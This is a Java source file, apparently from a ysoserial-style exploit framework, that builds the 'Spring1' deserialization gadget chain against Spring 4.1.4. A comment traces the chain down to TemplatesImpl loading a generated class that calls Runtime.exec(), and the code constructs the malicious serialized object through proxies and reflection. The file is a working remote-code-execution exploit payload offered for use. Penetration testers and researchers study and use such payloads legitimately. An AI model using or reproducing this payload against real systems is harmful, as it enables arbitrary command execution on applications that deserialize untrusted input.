package com.ppp.chain.spring;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

/*
	Gadget chain:

		ObjectInputStream.readObject()
			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.findMethod()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.invokeMethod()
					Method.invoke()
						Templates(Proxy).newTransformer()
							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
								ObjectFactory(Proxy).getObject()
									AnnotationInvocationHandler.invoke()
										HashMap.get()
								Method.invoke()
									TemplatesImpl.newTransformer()
										TemplatesImpl.getTransletInstance()
											TemplatesImpl.defineTransletClasses()
												TemplatesImpl.TransletClassLoader.defineClass()
													Pwner*(Javassist-generated).<static init>
														Runtime.exec()

 */
@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
@Authors({Authors.FROHOFF})
@Sink({Sink.TemplatesImpl})
public class Spring1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Spring1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        final ObjectFactory objectFactoryProxy = KickOff.createMemoitizedProxy(KickOff.createMap("getObject", templates), ObjectFactory.class);

        final Type typeTemplatesProxy = KickOff.createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, Templates.class);

        final Object typeProviderProxy = KickOff.createMemoitizedProxy(KickOff.createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
//        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
        Reflections.setFieldValue(mitp, "methodName", "getOutputProperties");

        return mitp;
    }
}
